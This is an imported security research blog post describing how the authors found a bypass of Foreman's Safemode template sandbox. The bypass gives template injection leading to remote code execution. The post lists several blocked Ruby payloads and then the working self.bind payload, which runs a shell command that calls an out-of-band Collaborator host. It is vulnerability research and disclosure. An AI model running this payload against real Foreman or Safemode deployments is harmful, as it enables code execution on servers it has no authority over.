---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-05-03_when-youre-so-bored-you-start-debugging-someone-elses-code-bug-hunting-in-a-rand.md
original_filename: 2023-05-03_when-youre-so-bored-you-start-debugging-someone-elses-code-bug-hunting-in-a-rand.md
title: 'When you''re so bored, you start debugging someone else''s code: bug hunting
  in a random Cloud-Native project'
category: documents
detected_topics:
- command-injection
- api-security
- supply-chain
tags:
- imported
- documents
- command-injection
- api-security
- supply-chain
language: en
raw_sha256: 64aa3ae841ea2802801ad7cfb814705badb495b40fbf23b76a288d8c169a88cb
text_sha256: b96cab9893b972a04cae7594b8baa6ca7d7269845725eedfed32fefb025f70c4
ingested_at: '2026-06-28T07:32:20Z'
sensitivity: unknown
redactions_applied: false
---

# When you're so bored, you start debugging someone else's code: bug hunting in a random Cloud-Native project

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-05-03_when-youre-so-bored-you-start-debugging-someone-elses-code-bug-hunting-in-a-rand.md
- Source Type: markdown
- Detected Topics: command-injection, api-security, supply-chain
- Ingested At: 2026-06-28T07:32:20Z
- Redactions Applied: False
- Raw SHA256: `64aa3ae841ea2802801ad7cfb814705badb495b40fbf23b76a288d8c169a88cb`
- Text SHA256: `b96cab9893b972a04cae7594b8baa6ca7d7269845725eedfed32fefb025f70c4`


## Content

---
title: "When you're so bored, you start debugging someone else's code: bug hunting in a random Cloud-Native project"
url: "https://blog.onsec.io/when-youre-so-bored-you-start-debugging-someone-elses-code/"
final_url: "https://blog.onsec.io/when-youre-so-bored-you-start-debugging-someone-elses-code/"
authors: ["ONSEC.io Research Team"]
programs: ["Foreman"]
bugs: ["SSTI", "RCE"]
publication_date: "2023-05-03"
added_date: "2023-05-04"
source: "pentester.land/writeups.json"
original_index: 1196
---

[pentest](https://blog.onsec.io/tag/pentest/)

# When you're so bored, you start debugging someone else's code: bug hunting in a random Cloud-Native project

[ ![ONSEC.io Research Team](https://storage.ghost.io/c/e5/82/e5827695-822b-4a4a-bc5e-d3a1ffa554d2/content/images/2024/10/Screenshot-2024-10-08-at-12.45.18-PM-1.png) ](/author/onsec-research/)

####  [ONSEC.io Research Team](/author/onsec-research/)

May 3, 2023 6 min

![When you're so bored, you start debugging someone else's code: bug hunting in a random Cloud-Native project](https://storage.ghost.io/c/e5/82/e5827695-822b-4a4a-bc5e-d3a1ffa554d2/content/images/size/w1200/2023/05/kandinsky-download-1683186712360.png)

# Intro

Our team has the challenge of finding bugs in popular Cloud-Native projects on Github. It's a fun activity that is a good alternative to platforms like HTB and benefits the project we're researching. However, unlike HTB, finding a bug is not guaranteed. We wanted to see how easy it is to find something interesting in a popular product with many stars and contributors.  
  
By fate, we chose the Foreman project (https://github.com/theforeman/foreman).  
  
But on a serious note, there were some reasons why we chose it as our test subject:

First, it has a large codebase which increases the chances of finding bugs.

Second, it had vulnerabilities in the past, including RCE (remote code execution), which made it an interesting target for us.

Third, there were no CVEs (Common Vulnerabilities and Exposures) reported for the project in 2022, which seemed odd.  

Foreman is a tool used to manage servers and deploy applications on them. We chose to study the latest version available at that time, which was 3.4.1.  

# Installation

Installation is quite simple. We followed the guide at https://theforeman.org/manuals/3.4/index.html#2.Quickstart and deployed the product on Debian 11.  

It's important to ensure that the server's hostname doesn't point to 127.0.0.1. You can check this with the command "ping $(hostname -f)". If it pings to 127.0.0.1, you need to edit the /etc/hosts file.  

For example:

1.2.3.4 foreman

After that, installation is straightforward.

sudo apt-get -y install ca-certificatescd /tmp && wget https://apt.puppet.com/puppet7-release-bullseye.debsudo apt-get install /tmp/puppet7-release-bullseye.debsudo wget https://deb.theforeman.org/foreman.asc -O /etc/apt/trusted.gpg.d/foreman.ascecho "deb http://deb.theforeman.org/ bullseye 3.4" | sudo tee /etc/apt/sources.list.d/foreman.listecho "deb http://deb.theforeman.org/ plugins 3.4" | sudo tee -a /etc/apt/sources.list.d/foreman.listsudo apt-get update && sudo apt-get -y install foreman-installer  
---  
  
Finally, you should see something like _"Foreman is running at https://theforeman.example.com"_.  
  
But, we hit a roadblock with an error that said **ERROR: invalid locale name: "en_US.utf8"**  
  
Luckily, we were able to fix it with the following steps:

locale-gen en_US.UTF-8locale-gen en_US.utf8dpkg-reconfigure localessystemctl restart postgresql  
---  
  
...and then we launched the **foreman-installer** once again.

# Quick Overview

Of course, with access to the source code, one can and should engage in whitebox testing, starting with running code analyzers (which, by the way, usually don't find anything useful), diving deep into the source code. However, we were feeling a bit lazy about it ;). Plus, we were curious to see if we could catch something off the bat, so to speak.  

So, we started with blackbox testing, using BurpSuite as a proxy and started poking around the application, building a site map, and learning about the product along the way.  

# RCE or not?!

Almost immediately, attention was drawn to the HOSTS > TEMPLATES section.

There you can manage templates for collecting data from controlled servers, as well as manage them.

Looking at the pre-installed templates, it became clear that these were Ruby ERB templates, which is not surprising since Foreman is written in Ruby.

Of course, the use of templates is a standard functionality of the application, so there is no reason to be happy about the discovery, but it provided a reason to test the possibility of RCE through SSTI...  

For testing, BurpSuite was not even needed, as a template can be created directly from the interface and switched between the Editor and Preview tabs.  

As can be seen from the examples below, templates allow "out of the box" execution of Ruby code, for example:

<%= text='test string'; puts text %><%= test={a:77, b:77}; puts test[:a]*test[:b] %>  
---  
  
In Preview we noticed ["[\"test string\"]\n"] and ["[5929]\n"].

![](https://storage.ghost.io/c/e5/82/e5827695-822b-4a4a-bc5e-d3a1ffa554d2/content/images/2023/04/data-src-image-b9b43c63-3e9d-41f6-a9ad-2d33e3fa10d8.png)![](https://storage.ghost.io/c/e5/82/e5827695-822b-4a4a-bc5e-d3a1ffa554d2/content/images/2023/04/data-src-image-7c61cdb0-6670-4853-b4e3-c21761258691.png)

But such a bug wouldn't be worth your attention and our time writing this article.  
  
It may seem like that's it, do whatever you want: execute OS commands, Ruby code, launch reverse shells, “steal, kill and destroy”...  
If it weren't for one "but" - the Safemode feature built into Foreman - an unremovable mechanism that nullifies all attempts to execute even remotely interesting code.

<%= puts ENV.keys %>There was an error rendering the template: Safemode doesn't allow to access 'constant' on ENV  
<%=`id`%>There was an error rendering the template: Safemode doesn't allow to access 'shell command' on `id`  
<%= x='77*77'; eval(x) %>There was an error rendering the template: Safemode doesn't allow to access 'eval' on #<Safemode::ScopeObject>  
<%= system('id') %>There was an error rendering the template: Safemode doesn't allow to access 'system' on #<Safemode::ScopeObject>  
<%= %x|id| %>There was an error rendering the template: Safemode doesn't allow to access 'shell command' on `id`  
ё<%= fork { exec("id") } %>There was an error rendering the template: Safemode doesn't allow to access 'fork' on #<Safemode::ScopeObject>  
---  
  
Well, you know the drill... Let's not drag our dear reader through all the attempts we made, let's just say that all our efforts to bypass the Safemode failed.  
  
But that only makes it more intriguing, so let's try to find a way to bypass it.  

# Diving into Safemode, searching for a bypass...

Safemode is not just your regular, run-of-the-mill, built-in protection mechanism in Ruby, but a creation of the same creative collective behind theforeman. The project code is open and available on Github at https://github.com/theforeman/safemode.  
  
Funny thing, the developers themselves warn us about the risks of using this product in the README!

"This library is still highly experimental. Only use it at your own risk for anything beyond experiments and playing."

Well, that's slightly reassuring and encouraging ;)  
  
Upon a cursory glance at the code, luckily there wasn't too much of it, a very strange thing was discovered...

see https://github.com/theforeman/safemode/blob/master/lib/safemode/scope.rb

(link to the commit at the time of writing the article: https://github.com/theforeman/safemode/blob/1e5370a6dbed55df520ab2b9a5a0123c68569360/lib/safemode/scope.rb) 

![](https://storage.ghost.io/c/e5/82/e5827695-822b-4a4a-bc5e-d3a1ffa554d2/content/images/2023/04/data-src-image-fd1d5a7b-c785-4113-8648-18cae4033d25.png)

So, there is a bind method that passes its arguments to eval... Looks fantastic! We just need to find the class that contains this method.  
  
The standard data types do not have this method:  

![](https://storage.ghost.io/c/e5/82/e5827695-822b-4a4a-bc5e-d3a1ffa554d2/content/images/2023/04/data-src-image-7899744a-ec0f-4e09-8aaf-1af4b6560d9c.png)![](https://storage.ghost.io/c/e5/82/e5827695-822b-4a4a-bc5e-d3a1ffa554d2/content/images/2023/04/data-src-image-995ce5d7-e784-43fa-8174-24ca06ab9e1f.png)

  
But it came to mind that we've already seen "Safemode::ScopeObject" when trying to execute <%= system('id') %>

Safemode doesn't allow to access 'system' on #Safemode::ScopeObject  
  
So, what if we try this?

<%= puts self.methods.select{|x| x == :bind} %>

![](https://storage.ghost.io/c/e5/82/e5827695-822b-4a4a-bc5e-d3a1ffa554d2/content/images/2023/04/data-src-image-fd441fdc-7489-4fe5-81e4-65dc1bc36989.png)![](https://storage.ghost.io/c/e5/82/e5827695-822b-4a4a-bc5e-d3a1ffa554d2/content/images/2023/04/data-src-image-fc3e933f-351c-47d4-83f0-803232b87e0c.png)

Bingo! Self is exactly what we need.  
  
Now, all we have to do is try calling this method and pass the code for eval inside it. The eval code should be contained in the Hash name, not in value.  
  
Here's what we got:

<%= self.bind({"xx=puts(`getent hosts qhb7r8pka5s8gk0ybjjt1ipmyd44sugj.oastify.com`)#" => 123} ) %>  
---  
  
In the Collaborator output, we can see a DNS request.

![](https://storage.ghost.io/c/e5/82/e5827695-822b-4a4a-bc5e-d3a1ffa554d2/content/images/2023/04/data-src-image-35579736-9c33-4da4-b9e0-48f228a26fab.png)

So we managed to find a way to bypass Safemode and execute arbitrary code.

## In conclusion…

We believe that this bug will also appear in other projects using the Safemode library. Perhaps in our next articles, we will explore this topic further.

Perhaps, perhaps, perhaps... 

**_Author:_**_**0x566164696D**_
